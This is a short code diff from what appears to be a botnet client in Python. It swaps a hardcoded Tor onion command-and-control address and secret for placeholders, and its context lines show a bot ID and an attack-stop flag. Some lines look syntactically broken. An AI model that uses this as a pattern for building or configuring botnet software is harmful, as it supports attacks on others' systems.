@@ -17,8 +17,8 @@ import zipfile
 import io
 import stat
 
-C2_ONION = njns5wsnjyzrvd6vtdlnyphu2of2uoqzuyjrpceaoglgdh6o356zceqd.onion
-SHARED_SECRET = 554a35a1a646aa79f84b5f9aa94f3c1b
+C2_ONION = "CHANGE_TO_YOUR_ONION_ADDRESS"
+SHARED_SECRET = "CHANGE_TO_C2_SECRET"
 C2_URL = f"http://{C2_ONION}"
 BOT_ID = hashlib.md5((socket.gethostname() + str(uuid.getnode()).encode()).hex().encode()).hexdigest()[:12]
 ATTACK_STOP = threading.Event()
